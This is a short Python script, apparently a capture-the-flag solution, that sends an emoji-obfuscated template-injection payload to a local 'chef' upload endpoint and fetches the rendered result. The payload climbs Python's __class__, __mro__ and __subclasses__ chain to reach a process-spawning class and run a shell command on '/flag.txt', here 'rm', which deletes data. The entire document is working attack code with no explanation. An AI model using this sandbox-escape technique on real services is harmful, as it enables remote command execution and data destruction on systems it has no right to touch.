import requests
import json

payload = {
    "text":"""
        🍴 a🍇""🥚__class__🥚__mro__🍎1🍏🥚__subclasses__🦀🦞🍎386🍏🦀🍎"rm"🌭"/flag.txt"🍏🌭stdout🍇🥠1🦞🍴
        🥢a🥚stdout🥚read🦀🦞🥢
    """
}

r = requests.post("http://localhost:8000/chef/upload", json=payload)

new_path = r.json()['url']

r = requests.get(f"http://localhost:8000{new_path}")

print(r.text)